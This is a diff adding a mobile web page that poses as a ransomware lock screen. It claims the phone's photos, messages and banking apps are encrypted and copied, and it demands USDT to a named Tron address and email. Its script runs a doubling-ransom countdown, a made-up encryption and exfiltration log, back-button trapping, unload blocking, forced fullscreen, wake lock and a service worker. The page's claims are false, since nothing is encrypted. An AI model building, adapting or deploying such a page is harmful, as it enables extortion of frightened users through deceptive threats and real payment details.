@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<meta name="theme-color" content="#060000">
+<meta name="format-detection" content="telephone=no">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="apple-mobile-web-app-title" content="LOCKED">
+<title>SYSTEM LOCKED</title>
+<link rel="manifest" href="manifest.json">
+<link rel="apple-touch-icon" href="icon-512.png">
+<style>
+  html,body{margin:0;padding:0;height:100%;overflow:hidden;background:#000;overscroll-behavior:none}
+  .shell{position:absolute;inset:0;overflow-y:auto;overflow-x:hidden;background:#060000;color:#f4f0f0;
+    font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+    -webkit-user-select:none;user-select:none;-webkit-tap-highlight-color:transparent;-webkit-touch-callout:none}
+  .shell *{box-sizing:border-box}
+  .bg{position:absolute;inset:0;background:radial-gradient(circle at 50% 0%,#330404 0%,#0a0000 55%,#000 100%)}
+  .bg::after{content:"";position:absolute;inset:0;background:url('bg.jpg') center/cover no-repeat;opacity:.16;filter:contrast(1.3) grayscale(.4)}
+  .scan{position:absolute;inset:0;pointer-events:none;z-index:3;background:repeating-linear-gradient(0deg,rgba(255,40,40,.05) 0 1px,transparent 1px 3px);animation:sc 9s linear infinite}
+  @keyframes sc{to{background-position-y:300px}}
+  .sweep{position:absolute;left:0;right:0;height:120px;z-index:3;pointer-events:none;
+    background:linear-gradient(180deg,transparent,rgba(255,30,30,.09),transparent);animation:sw 5.5s linear infinite}
+  @keyframes sw{0%{top:-140px}100%{top:100%}}
+  .glow{position:absolute;inset:0;z-index:2;pointer-events:none;box-shadow:inset 0 0 90px rgba(255,0,0,.22)}
+  .inner{position:relative;z-index:4;padding:calc(18px + env(safe-area-inset-top)) 16px calc(34px + env(safe-area-inset-bottom));text-align:center}
+  .topbar{display:flex;justify-content:space-between;font-size:9px;letter-spacing:.16em;color:#7d5b5b;border-bottom:1px solid #240909;padding-bottom:7px;margin-bottom:16px}
+  .dot{width:6px;height:6px;border-radius:50%;background:#ff2020;display:inline-block;box-shadow:0 0 8px #ff2020;animation:bl 1.1s infinite}
+  @keyframes bl{50%{opacity:.15}}
+  .rec{color:#ff2020}
+  .skull{width:78px;height:78px;display:block;margin:0 auto 10px;stroke:#ff2020;fill:none;stroke-width:3;stroke-linejoin:round;
+    filter:drop-shadow(0 0 14px rgba(255,0,0,.85));animation:pu 2.4s ease-in-out infinite}
+  .skull circle,.skull path:nth-child(3){fill:#ff2020}
+  @keyframes pu{50%{transform:scale(1.07);filter:drop-shadow(0 0 26px rgba(255,0,0,1))}}
+  .glitch{position:relative;margin:0;font-size:27px;letter-spacing:.1em;color:#fff;text-shadow:0 0 22px rgba(255,0,0,.9)}
+  .glitch::before,.glitch::after{content:attr(data-text);position:absolute;left:0;top:0;width:100%}
+  .glitch::before{color:#00e0ff;clip-path:inset(0 0 56% 0);animation:g1 2.7s steps(2) infinite}
+  .glitch::after{color:#ff2020;clip-path:inset(56% 0 0 0);animation:g2 2.1s steps(2) infinite}
+  @keyframes g1{0%,88%,100%{transform:translate(0)}90%{transform:translate(-3px,-1px)}94%{transform:translate(2px,1px)}}
+  @keyframes g2{0%,86%,100%{transform:translate(0)}88%{transform:translate(3px,1px)}92%{transform:translate(-2px,-1px)}}
+  .tag{font-size:9px;letter-spacing:.3em;color:#ff4d4d;margin:8px 0 16px}
+  .lead{font-size:12.5px;line-height:1.65;color:#cfc3c3;margin:0 0 12px}
+  .lead b{color:#ff3b3b}
+  .panel{border:1px solid #3a0d0d;background:rgba(28,4,4,.62);margin:14px 0;text-align:left}
+  .row{display:flex;justify-content:space-between;align-items:center;padding:9px 11px;font-size:10.5px;letter-spacing:.09em;color:#9c8080;border-bottom:1px solid #250808}
+  .row:last-child{border:0}
+  .row span:last-child{color:#fff}
+  .amt{color:#ff2020!important;font-weight:700;font-size:17px;text-shadow:0 0 12px rgba(255,0,0,.7)}
+  .bad{color:#ff2020!important;letter-spacing:.2em}
+  .addrbox{border:1px dashed #521414;background:rgba(40,6,6,.55);padding:12px}
+  .lbl{font-size:9px;letter-spacing:.2em;color:#a17a7a;margin-bottom:9px}
+  .addr{font-size:12px;word-break:break-all;color:#ffd9d9;background:#120202;border:1px solid #3a0d0d;padding:9px;line-height:1.5}
+  .addrbtns{display:flex;gap:8px;margin-top:9px;align-items:center}
+  #qr{width:62px;height:62px;background:#fff;padding:3px;margin-left:auto;display:block}
+  .ghost{flex:1;background:transparent;border:1px solid #ff2020;color:#ff5a5a;font-family:inherit;font-size:10.5px;letter-spacing:.14em;padding:11px;cursor:pointer}
+  .ghost:active{background:#ff2020;color:#000}
+  .warnline{font-size:9px;letter-spacing:.1em;color:#8d6a6a;margin-top:8px}
+  .timer{margin:16px 0;border:1px solid #451111;background:rgba(30,3,3,.7);padding:12px}
+  .timer.hot{border-color:#ff2020;animation:hb .9s infinite}
+  @keyframes hb{50%{background:rgba(90,0,0,.75)}}
+  .clock{font-size:40px;font-weight:700;color:#ff2020;letter-spacing:.06em;text-shadow:0 0 24px rgba(255,0,0,.8);line-height:1.1;margin:4px 0}
+  .pen{font-size:9.5px;letter-spacing:.14em;color:#ff8a8a}
+  .unlock{margin:16px 0}
+  .pwrow{display:flex;gap:8px}
+  #pw{flex:1;min-width:0;background:#0d0101;border:1px solid #4d1212;color:#fff;font-family:inherit;font-size:19px;
+    letter-spacing:.42em;text-align:center;padding:13px 6px;outline:none;border-radius:0;-webkit-user-select:text;user-select:text}
+  #pw:focus{border-color:#ff2020;box-shadow:0 0 0 2px rgba(255,0,0,.16)}
+  #go{background:#ff2020;color:#000;border:0;font-family:inherit;font-weight:700;font-size:11.5px;letter-spacing:.14em;padding:0 18px;cursor:pointer}
+  #go:active{background:#ff5c5c}
+  .msg{font-size:10px;letter-spacing:.1em;min-height:14px;margin-top:8px;color:#ff8080}
+  .shake{animation:sh .34s}
+  @keyframes sh{0%,100%{transform:translateX(0)}20%{transform:translateX(-7px)}40%{transform:translateX(7px)}60%{transform:translateX(-5px)}80%{transform:translateX(5px)}}
+  .contact{font-size:10.5px;line-height:1.8;color:#9d8484;border-top:1px solid #240909;padding-top:13px}
+  .contact a{color:#ff3b3b;text-decoration:none;word-break:break-all}
+  .log{margin:14px 0;text-align:left;font-size:9px;line-height:1.75;color:#6d8a6d;background:#040a04;border:1px solid #0e2410;padding:9px;height:76px;overflow:hidden}
+  .log b{color:#8fff8f}
+  .foot{font-size:8.5px;letter-spacing:.19em;color:#6b5050;margin-top:8px}
+  .ok{position:fixed;inset:0;z-index:20;background:#02120a;display:none;flex-direction:column;align-items:center;justify-content:center;padding:30px 22px;text-align:center}
+  .ok.show{display:flex}
+  .okmark{width:74px;height:74px;border-radius:50%;border:2px solid #25ff88;color:#25ff88;font-size:38px;line-height:70px;margin-bottom:16px;box-shadow:0 0 32px rgba(37,255,136,.5)}
+  .ok h2{color:#25ff88;letter-spacing:.16em;font-size:19px;margin:0 0 12px}
+  .ok p{color:#a9c9b6;font-size:12px;line-height:1.7;margin:0 0 10px}
+  .ok .small{font-size:10px;color:#7ba48a;letter-spacing:.14em}
+  .ok .ghost{flex:none;width:auto;padding:12px 22px;border-color:#25ff88;color:#25ff88;margin-top:8px}
+</style>
+</head>
+<body>
+<div class="shell" id="shell">
+  <div class="bg"></div><div class="scan"></div><div class="sweep"></div><div class="glow"></div>
+
+  <div class="inner" id="inner">
+    <div class="topbar"><span><span class="dot"></span> SECURE SHELL v4.2</span><span class="rec">● REC</span></div>
+
+    <svg class="skull" viewBox="0 0 100 100" aria-hidden="true">
+      <path d="M50 5C28 5 13 20 13 41c0 12 5 19 10 24 3 3 4 6 4 10v9c0 5 4 8 9 8h4v-9h7v9h6v-9h7v9h4c5 0 9-3 9-8v-9c0-4 1-7 4-10 5-5 10-12 10-24C87 20 72 5 50 5z"/>
+      <circle cx="35" cy="43" r="8.5"/><circle cx="65" cy="43" r="8.5"/>
+      <path d="M50 55l-6.5 13h13z"/><path d="M39 80v9M50 80v9M61 80v9"/>
+    </svg>
+
+    <h1 class="glitch" data-text="SYSTEM LOCKED">SYSTEM LOCKED</h1>
+    <div class="tag">DEVICE COMPROMISED · AES-256</div>
+
+    <p class="lead">Your phone has been <b>HACKED</b>. Every photo, contact, message, note and banking app on this device has been <b>encrypted and copied</b> to our servers.</p>
+    <p class="lead">The screen stays locked until you pay. Pay, then enter the 8-digit unlock code.</p>
+
+    <div class="panel">
+      <div class="row"><span>AMOUNT DUE</span><span class="amt"><i id="amt">10</i>&nbsp;USDT</span></div>
+      <div class="row"><span>NETWORK</span><span>TRC-20 · Tron</span></div>
+      <div class="row"><span>DEVICE ID</span><span id="devid">—</span></div>
+      <div class="row"><span>STATUS</span><span class="bad">LOCKED</span></div>
+    </div>
+
+    <div class="addrbox">
+      <div class="lbl">SEND EXACTLY TO THIS ADDRESS</div>
+      <div class="addr" id="addr">TEpUFeVXKJdFHqjZccqAU2zVQLgTvAzvtu</div>
+      <div class="addrbtns">
+        <button class="ghost" id="copy">COPY ADDRESS</button>
+        <img id="qr" alt="QR" src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&margin=0&data=TEpUFeVXKJdFHqjZccqAU2zVQLgTvAzvtu">
+      </div>
+      <div class="warnline">TRC-20 ONLY · wrong network = lost funds</div>
+    </div>
+
+    <div class="timer" id="timerBox">
+      <div class="lbl">PAYMENT WINDOW · AFTER THIS THE RANSOM DOUBLES</div>
+      <div class="clock" id="clock">10:00</div>
+      <div class="pen" id="pen">NEXT PENALTY → 20 USDT</div>
+    </div>
+
+    <div class="unlock">
+      <div class="lbl">ALREADY PAID? ENTER UNLOCK CODE</div>
+      <div class="pwrow">
+        <input id="pw" type="text" inputmode="numeric" maxlength="8" placeholder="••••••••" autocomplete="off" spellcheck="false">
+        <button id="go">UNLOCK</button>
+      </div>
+      <div class="msg" id="msg"></div>
+    </div>
+
+    <div class="contact">After paying, email the proof + DEVICE ID to<br><a id="mail" href="mailto:carolinawood2530@gmail.com">carolinawood2530@gmail.com</a></div>
+
+    <div class="log" id="log"></div>
+    <div class="foot">DO NOT POWER OFF · DO NOT RESTORE · DO NOT SWIPE</div>
+  </div>
+
+  <div class="ok" id="ok">
+    <div class="okmark">✓</div>
+    <h2>DEVICE UNLOCKED</h2>
+    <p>Code accepted. Your files are being decrypted in the background.</p>
+    <p class="small">Unlock code: <b>25302530</b></p>
+    <button class="ghost" id="rearm">RE-ARM LOCK (TEST)</button>
+  </div>
+</div>
+
+<script>
+(function(){
+  "use strict";
+  var ADDR="TEpUFeVXKJdFHqjZccqAU2zVQLgTvAzvtu", MAIL="carolinawood2530@gmail.com", PASS="25302530";
+  var BASE=10, DUR=10*60*1000, PEN=30*1000, K="dblx_";
+  var g=function(k,d){try{var v=localStorage.getItem(K+k);return v===null?d:v}catch(e){return d}};
+  var s=function(k,v){try{localStorage.setItem(K+k,v)}catch(e){}};
+  var $=function(i){return document.getElementById(i)};
+
+  if(location.search.indexOf("reset")>-1){try{localStorage.clear()}catch(e){}}
+
+  var locked=g("locked","1")==="1";
+  var amount=+g("amount",BASE)||BASE;
+  var deadline=+g("deadline",0)||0;
+  var devid=g("devid","");
+  if(!devid){var h="0123456789ABCDEF",r="DEV";for(var i=0;i<4;i++){r+="-"+h[Math.floor(Math.random()*16)]+h[Math.floor(Math.random()*16)]}devid=r;s("devid",devid)}
+  if(!deadline){deadline=Date.now()+DUR;s("deadline",deadline)}
+
+  var guard=0;
+  while(deadline<=Date.now()&&guard++<6){amount*=2;deadline+=DUR}
+  if(deadline<=Date.now())deadline=Date.now()+DUR;
+  s("amount",amount);s("deadline",deadline);
+
+  $("devid").textContent=devid;
+  $("mail").href="mailto:"+MAIL+"?subject=PAYMENT%20PROOF%20"+devid+"&body=Device%20ID:%20"+devid+"%0ATXID:%20";
+
+  function pad(n){return n<10?"0"+n:""+n}
+  function paint(){
+    var left=Math.max(0,deadline-Date.now()), m=Math.floor(left/60000), sec=Math.floor(left%60000/1000);
+    $("clock").textContent=pad(m)+":"+pad(sec);
+    $("amt").textContent=amount;
+    $("pen").textContent="NEXT PENALTY → "+(amount*2)+" USDT";
+    $("timerBox").className="timer"+(left<60000?" hot":"");
+  }
+  paint();
+  setInterval(function(){
+    if(!locked)return;
+    if(Date.now()>=deadline){amount*=2;deadline=Date.now()+DUR;s("amount",amount);s("deadline",deadline);log("!! DEADLINE MISSED - RANSOM DOUBLED")}
+    paint();
+  },250);
+
+  var lines=["kernel: lock state persisted","aes256: 4,182 files sealed","contacts.db -> encrypted","DCIM/* -> encrypted","wa_messages.db -> encrypted","exfil: 312 MB uploaded","payment gateway: TRC-20","awaiting transaction..."];
+  var li=0;
+  function log(t){var d=document.createElement("div");d.innerHTML="<b>&gt;</b> "+(t||lines[li++%lines.length]);$("log").appendChild(d);if($("log").children.length>9)$("log").removeChild($("log").firstChild)}
+  for(var j=0;j<4;j++)log();
+  setInterval(function(){if(locked)log()},2600);
+
+  $("copy").addEventListener("click",function(){
+    var b=$("copy");
+    var done=function(){b.textContent="COPIED";setTimeout(function(){b.textContent="COPY ADDRESS"},1600)};
+    if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(ADDR).then(done,done)}
+    else{var t=document.createElement("textarea");t.value=ADDR;document.body.appendChild(t);t.select();try{document.execCommand("copy")}catch(e){}document.body.removeChild(t);done()}
+  });
+  $("qr").onerror=function(){$("qr").style.display="none"};
+
+  function tryUnlock(){
+    var v=$("pw").value.replace(/\D/g,"");
+    if(v===PASS){
+      locked=false;s("locked","0");
+      $("ok").classList.add("show");
+      if(document.exitFullscreen&&document.fullscreenElement)document.exitFullscreen().catch(function(){});
+      if(window.__wl&&window.__wl.release)try{window.__wl.release()}catch(e){}
+      log("KEY OK - decrypting");
+    }else{
+      $("inner").classList.add("shake");setTimeout(function(){$("inner").classList.remove("shake")},360);
+      $("msg").textContent="ACCESS DENIED · WRONG CODE · -30s PENALTY";
+      deadline=Math.max(Date.now(),deadline-PEN);s("deadline",deadline);paint();
+      $("pw").value="";$("pw").focus();
+    }
+  }
+  $("go").addEventListener("click",tryUnlock);
+  $("pw").addEventListener("keydown",function(e){if(e.key==="Enter")tryUnlock()});
+  $("rearm").addEventListener("click",function(){
+    s("locked","1");s("amount",BASE);s("deadline",Date.now()+DUR);location.reload();
+  });
+
+  document.addEventListener("contextmenu",function(e){e.preventDefault()});
+  document.addEventListener("selectstart",function(e){e.preventDefault()});
+  window.addEventListener("beforeunload",function(e){if(locked){e.preventDefault();e.returnValue=""}});
+  history.pushState({l:1},"",location.href);
+  window.addEventListener("popstate",function(){if(locked)history.pushState({l:1},"",location.href)});
+
+  function arm(){
+    if(!locked)return;
+    var el=document.documentElement;
+    if(el.requestFullscreen&&!document.fullscreenElement)el.requestFullscreen({navigationUI:"hide"}).catch(function(){});
+    if(navigator.wakeLock)navigator.wakeLock.request("screen").then(function(w){window.__wl=w}).catch(function(){});
+  }
+  document.addEventListener("click",arm,{once:true});
+  document.addEventListener("touchstart",arm,{once:true});
+  document.addEventListener("visibilitychange",function(){if(document.visibilityState==="visible"&&locked){paint();arm()}});
+  window.addEventListener("focus",function(){if(locked)paint()});
+
+  if("serviceWorker" in navigator)navigator.serviceWorker.register("sw.js").catch(function(){});
+})();
+</script>
+</body>
+</html>
